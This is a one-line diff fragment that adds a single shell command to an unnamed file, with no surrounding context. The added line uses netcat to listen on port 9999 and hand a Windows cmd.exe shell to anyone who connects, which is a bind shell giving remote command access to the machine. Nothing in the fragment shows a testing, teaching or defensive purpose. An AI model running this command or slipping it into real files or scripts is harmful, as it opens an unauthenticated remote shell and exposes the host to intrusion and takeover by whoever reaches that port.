@@ -1,0 +1,1 @@
+nc -l -p 9999 -e cmd.exe
